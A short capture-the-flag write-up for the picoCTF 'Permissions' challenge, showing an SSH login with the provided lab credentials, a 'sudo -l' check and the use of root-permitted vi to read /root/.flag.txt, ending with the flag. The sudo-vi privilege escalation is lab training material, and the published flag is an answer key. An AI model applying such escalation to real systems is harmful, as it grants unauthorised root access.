# Permissions

## Descripción
Can you read files in the root file?

The system admin has provisioned an account for you on the main server:`ssh -p 58193 picoplayer@saturn.picoctf.net`Password: `UYiOazkqY2`
## Solución
### Solución:
```
┌──(kali㉿kali)-[~]
└─$ ssh -p 51302 picoplayer@saturn.picoctf.net
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Feb 17 03:19:06 2026 from 177.232.4.154
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi

picoplayer@challenge:~$ sudo vi

[No write since last change]
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 17 03:17 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile

Press ENTER or type command to continue
[No write since last change]
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
```

picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
## Notas
